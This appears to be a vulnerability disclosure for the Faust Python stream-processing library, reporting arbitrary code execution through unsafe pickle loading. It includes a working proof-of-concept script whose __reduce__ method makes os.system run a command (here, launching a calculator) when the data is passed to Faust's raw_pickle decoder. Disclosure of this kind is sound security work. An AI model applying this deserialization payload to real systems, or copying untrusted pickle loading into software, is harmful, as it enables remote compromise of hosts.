# Description
Faust is a stream processing library, porting the ideas from Kafka Streams to Python.It is used at Robinhood to build high performance distributed systems and real-time data pipelines that process billions of events every day.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip install faust')
from faust.serializers import codecs
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
codecs.raw_pickle._loads(dumps,dumps)
```
* `pip3 install faust`
* `python3 exploit.py`
